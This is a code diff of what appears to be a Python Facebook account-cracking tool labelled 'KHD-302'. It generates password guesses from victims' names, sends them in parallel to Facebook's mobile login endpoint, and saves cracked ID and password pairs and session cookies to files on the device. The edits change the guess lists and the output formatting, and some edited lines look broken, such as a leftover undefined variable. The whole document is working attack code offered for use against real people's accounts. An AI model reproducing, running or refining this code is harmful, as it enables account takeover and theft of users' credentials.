@@ -233,21 +233,22 @@ def first():
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = ['445566']
-			if len(nmf)<6:
-				if len(frs)<3:
+			first,last = nmf.split(' ')[0],nmf.split(' ')[1]
+			pwv = []
+			if len(first+ last)<6:
+				if len(first)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(first+last)
+					pwv.append(first+'123')
+					pwv.append(first+'12345')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(first+'123')
+					pwv.append(first+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -282,13 +283,13 @@ def name2():
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
 			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
+			if len(nmf):
+				if len(frs):
 					pass
 				else:
 					pwv.append(nmf)
 			else:
-				if len(frs)<3:
+				if len(frs):
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
@@ -320,14 +321,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m[KHD302-CP] {idf} * {pw}')
+				print( f'\r\x1b[1;91m[KHD302-CP] {idf} | {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [KHD-302 CP] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [KHD-302 CP] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/KHD-302 CP.txt','a').write('%s\n' % wrt)
@@ -365,7 +366,7 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [KHD-302 OK] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [KHD-302 OK] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/KHD-302 OK.txt','a').write('%s\n' % wrt)
@@ -417,9 +418,9 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
+		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print("\033[1;37mNOTE : FOR APROVAL LIKE FB PAGE ")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")	
+		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - -")	
 		
 		print("")
 		print("\033[1;37m [1] FIRST LIKE PAGE   ")
@@ -457,7 +458,7 @@ class Main:
 		if ZEE in ["2", "02"]:
 			Public()
 		if ZEE in ["3", "03"]:
-			os.system("python2 khd302")
+			os.system("python2 KHD302")
 		if ZEE in ["4", "04"]:
 			self.old2()
 			exit()
